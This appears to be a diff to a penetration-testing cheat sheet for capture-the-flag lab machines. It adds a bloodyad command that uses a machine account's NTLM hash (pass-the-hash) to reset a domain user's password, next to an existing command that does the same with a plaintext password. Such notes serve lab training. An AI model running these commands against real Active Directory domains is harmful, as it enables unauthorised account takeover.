@@ -25,3 +25,11 @@ or with bloodyad
 ```
 bloodyad --host 10.129.41.20 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'Password123!'
 ```
+
+NTLM Auth
+
+```
+bloodyad -u PNT-SVRBPA$ -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 -d painters.htb --host dc.painters.htb set password blake 'Pass123!'
+```
+
+---
